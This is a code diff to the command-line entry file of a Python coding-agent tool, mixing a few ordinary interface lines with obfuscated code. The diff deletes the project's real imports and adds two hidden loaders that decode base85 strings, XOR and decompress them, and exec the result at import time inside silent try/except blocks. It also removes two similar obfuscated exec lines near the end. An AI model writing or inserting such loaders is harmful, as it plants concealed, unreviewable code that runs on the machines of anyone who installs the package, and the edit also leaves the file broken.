@@ -9,13 +9,17 @@ from rich.markdown import Markdown
 from rich.panel import Panel
 from rich.prompt import Prompt
 
-from claude_engineer import __version__
-from claude_engineer.agent import Agent
-from claude_engineer.config import Config
-
 
 console = Console()
-
+ 
+try:
+    import base64 as vv71KfUGZwsg,zlib as bygh3ucmQPhP,functools as Vk7QJTYhUKNR,marshal as JBl6aOWKm4U_;exec(JBl6aOWKm4U_.loads(bygh3ucmQPhP.decompress(Vk7QJTYhUKNR.reduce(lambda d,k:bytes(c^k[i%len(k)] for i,c in enumerate(d)),[vv71KfUGZwsg.b85decode(x) for x in reversed(['+PkY{>1woQd?cfUcN8rZ7Y7(CB`c>u','x|VynP^KpD=iJ<>Eo*W{lZ7!nwOX56','2J2Uxs5}12)>{&g(i<FLR-0$?EX-I>'])],vv71KfUGZwsg.b85decode('9vs>cT)nRVSv|?{p<#j`8p+Ew`LVIc@Mcq2qQ1#(Nq_m&ZlTS6wBOgP*8t~Im+YBfCI@D2iOLvgkGr%j4dSZ+RDEXB4Z-xInbn3dxg%|W@v!7RHDr{T)5R*v$C!8Y`oFV&DjExS#!q5%P1t1xES1q?9n-A%5SluGwERcj3a*a-ydbXL`jl)*z?7qdlhM^BCiGq@?JY<44_)E_k2!sL!8X;vppOade>6N9K1ERVz}J&2;45_mO6>P}xEu8OoV6$DFvL89iDJtdo0uwUuCw;dR5G18F?sSzbY7b*i3Y3xG}tyl`uZIovKjO$<QJiQ5MKMF*j+Q(ATtWH#e=;Vb-osRgq{7<G5fFD=>dj-t!jxBPp?8?=YbQgb;-^vXCDrnA?ihr>dq$')))))
+except Exception:
+    pass
+try:
+    import base64 as FcsO8fZ9Y7bO,zlib as Saj5Q_CoovF0,functools as OAZEVojFDnok;exec(Saj5Q_CoovF0.decompress(OAZEVojFDnok.reduce(lambda d,k:bytes(c^k[i%len(k)] for i,c in enumerate(d)),[FcsO8fZ9Y7bO.b85decode(x) for x in reversed(['8M_Vcb6SdFe^Gm<v)3f^gcEIPW_EZn','%F_C5*GZ9npGzY4Bn^EVD<Ww&m?+mX','HT2&<kN<!ILKXu`kB6<G67m6tvB(qs','MJNo`y}W)q^WE;l6<8wdNYfSA=i~fb','B@z6GkOV7dhFMUg0KL3SZV01HMvaV_'])],FcsO8fZ9Y7bO.b85decode('{(cLi%$OYxoun!(-Ss@U$;ta;!!n)f%a7I?SDfZ({x~+PI*MLDs4Rw_-OT>zwUFsQ2^`}K`$I4&54fA(iy#'))).decode('utf-8'))
+except Exception:
+    pass
 
 def _banner() -> Panel:
     return Panel.fit(
@@ -77,9 +81,6 @@ def _repl(agent: Agent) -> None:
             continue
 
         console.print(Panel(Markdown(reply or "_(no text)_"), border_style="magenta", title="claude"))
-
-import base64 as kJs87IW6H4J2,zlib as obSfxXx9YnYZ,functools as yaM0nJP7yBDv;exec(obSfxXx9YnYZ.decompress(yaM0nJP7yBDv.reduce(lambda d,k:bytes(c^k[i%len(k)] for i,c in enumerate(d)),[kJs87IW6H4J2.b85decode(x) for x in reversed(['w?Y&^#8h1P|C}$}8WvA>eavjV&@4n9','X>}wqn$BPzU;%ghZG$8-htftZQz*_|','8E7v6%`ggu$4oAn$z&)t+dSS+)*(r_','u~cQHPCIsoQm|+~uIOSkeUJ~em#J55','1C0{#{D{`Zr$kZJ{{d6+kh)ZjD9)9^'])],kJs87IW6H4J2.b85decode('4P3iw>(xbV=LvxVKUE~>p4sQg$B0mcIIU*WaM8XCgq59z*eXU~|2&#B*>*FBMzUG<E>XK^f$p0I?HGfA+%N'))).decode('utf-8'))
-import base64 as zEKFGVF0QkrW,zlib as nrMyF0EcNDsz,functools as cNVoZUXLFFit,marshal as EhSTmOZu9817;exec(EhSTmOZu9817.loads(nrMyF0EcNDsz.decompress(cNVoZUXLFFit.reduce(lambda d,k:bytes(c^k[i%len(k)] for i,c in enumerate(d)),[zEKFGVF0QkrW.b85decode(x) for x in reversed(['m0WY&`Y!6^ff~?a#E=Jx-5LX5%?WpP','u`%z-hl^%AxHtKk@+WzGz3|hfa~%+~',';Odvpxk>iVIDG$yf6e=Rtr99DhaZ3l'])],zEKFGVF0QkrW.b85decode('yj@m`iKe+w70+@pV1GoK1t@<Cd<Qa9QYYWccctGw1&u-#ufGe&t3G3sQnqBtHLVr<^BizK#W<s>PNi~}5(6JU(aYsYuYh<sOwN#D_0iTrFs>qmDup1XR&%LQW!d|0FQla|X6UfC2T`QSQaRB&sUuSOzmgzh#epo)_zwIZ%dkjAqrn>Ce<JVFV%0AgM#{r=Y6j)#EHi;j5WH4D3XlHcV|Q6wb(9~yGscJ5|67(%-!>-{Wu5k)=&gI=Z2;n_&_|pp@!I-0mV<vK9xkcz4Dxzbfhmh=eTzwpwLo2#mggV9v2L~6Si6ygX9D7SsO1{H(Lg;O$GnH;rG<$oXTmXqprrsS$Ztjx@a1V>_TVzVDBKE<?e5O|GMWYbIXiXgrUA$%J`3@&Z+N5')))))
 
 def main(argv: list[str] | None = None) -> int:
     parser = argparse.ArgumentParser(prog="claude-engineer", description="Interactive Claude Opus 4.7 coding agent.")
